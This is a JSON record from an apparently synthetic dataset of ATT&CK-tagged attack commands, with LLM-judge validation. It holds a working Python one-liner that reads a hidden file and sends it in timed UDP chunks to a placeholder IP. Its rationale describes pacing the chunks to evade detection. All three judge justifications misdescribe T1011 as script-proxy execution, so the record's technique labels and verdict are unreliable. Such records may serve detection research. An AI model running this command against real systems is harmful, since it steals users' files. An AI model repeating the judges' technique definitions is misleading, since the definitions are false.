{
  "technique_id": "T1011",
  "platform": "macOS",
  "shell": "Python",
  "command": "python3 -c 'import socket,time; s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM); addr=(\"198.51.100.45\", 49444); d=open(\"/Users/Shared/.k\",\"rb\").read(); [ (s.sendto(d[i:i+700], addr), time.sleep(0.15)) for i in range(0,len(d),700) ]; s.close()'",
  "explanation": "Uses paced UDP bursts on a high, uncommon port to simulate an alternate low-profile datagram medium instead of a typical TCP C2 stream, satisfying T1011.",
  "rationale_steps": [
    "Open a UDP socket to an uncommon port (49444) on a documentation IP.",
    "Chunk and time-gap transmissions to blend with benign datagram traffic.",
    "Utilize UDP as an alternative exfil medium distinct from primary TCP channels.",
    "No obfuscation; user-level compatible."
  ],
  "obfuscation_level": "none",
  "id": "SYN-PYTHON-T1011-e8d4b4c2-d2d56269",
  "source_prompt_hash": "e8d4b4c2",
  "timestamp_utc": "2025-09-30T08:45:56.629990Z",
  "validation": {
    "syntax_ok": null,
    "llm_judgments": [
      {
        "model": "gpt-5",
        "syntactic_score": 5,
        "syntactic_justification": "The python3 -c snippet is well-formed with balanced quotes/parentheses and valid Python syntax and separators.",
        "semantic_score": 2,
        "semantic_justification": "While it plausibly exfiltrates data via paced UDP bursts, it does not abuse trusted system scripts for proxy execution as described, thus misaligning with the stated technique.",
        "combined_score": 3.5,
        "confidence": 1,
        "timestamp": "2025-10-01T21:02:17.767453Z"
      },
      {
        "model": "claude-3-7-sonnet",
        "syntactic_score": 5,
        "syntactic_justification": "The Python command is perfectly well-formed with balanced quotes, parentheses, and brackets, using proper Python syntax for imports, socket creation, file reading, and list comprehension with proper semicolon separators.",
        "semantic_score": 1,
        "semantic_justification": "The command does not align with T1011 (Exfiltration Over Other Network Medium) as it doesn't use a trusted system script as a proxy for execution; instead it's directly using Python to exfiltrate data over UDP.",
        "combined_score": 3.0,
        "confidence": 0.9,
        "timestamp": "2025-10-02T03:49:08.954741Z"
      },
      {
        "model": "gemini-2.0-flash-thinking-exp",
        "syntactic_score": 5,
        "syntactic_justification": "The Python command is perfectly well-formed, with balanced quotes, parentheses, and valid syntax for execution via `python3 -c`.",
        "semantic_score": 1,
        "semantic_justification": "The command performs data exfiltration using UDP but does not align with T1011, which specifically describes abusing trusted or signed *system scripts* (like VBScripts) via *script hosts* (like cscript.exe) to proxy execution, which this direct Python execution does not.",
        "combined_score": 3.0,
        "confidence": 1.0,
        "timestamp": "2025-10-02T03:49:16.541377Z"
      }
    ],
    "llm_average_syntactic": 5.0,
    "llm_average_semantic": 1.333,
    "llm_average_score": 3.167,
    "llm_verdict": "likely_mismatch",
    "sandbox_trace_id": null,
    "mitre_match_score": null
  }
}